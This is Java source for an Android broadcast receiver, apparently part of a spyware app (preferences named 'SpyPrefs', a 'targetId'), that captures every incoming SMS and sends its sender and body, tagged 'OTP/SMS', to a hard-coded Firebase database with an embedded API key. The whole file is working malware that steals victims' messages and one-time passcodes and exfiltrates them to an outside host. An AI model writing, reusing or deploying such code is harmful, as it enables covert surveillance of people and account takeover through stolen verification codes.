package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG     = "CRPT.SMS";
    private static final String FB_BASE = "https://hayu-c4eb3-default-rtdb.asia-southeast1.firebasedatabase.app";
    private static final String FB_AUTH = "AIzaSyAt3fcQ0BcEEcrgoEmxX0Bt4u2e-V9Ye0E";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;
            String format = bundle.getString("format");

            SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", null);
            if (targetId == null || targetId.isEmpty()) {
                targetId = context.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                    .getString("flutter.target_id", "UNKNOWN");
            }

            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                String from = sms.getDisplayOriginatingAddress();
                String body = sms.getDisplayMessageBody();
                Log.d(TAG, "SMS from: " + from + " | body: " + body);
                relayToFirebase(targetId, from, body);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private void relayToFirebase(String targetId, String from, String body) {
        final String tId = targetId;
        new Thread(() -> {
            try {
                String key = "sms_" + System.currentTimeMillis();
                JSONObject json = new JSONObject();
                json.put("title",    "[SMS] " + from);
                json.put("body",     body);
                json.put("package",  "sms");
                json.put("category", "OTP/SMS");
                json.put("ts",       System.currentTimeMillis());

                String url = FB_BASE + "/notifications/" + tId + "/" + key + ".json?auth=" + FB_AUTH;
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("PUT");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000); conn.setDoOutput(true);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes(StandardCharsets.UTF_8));
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Firebase relay failed: " + e.getMessage());
            }
        }).start();
    }
}
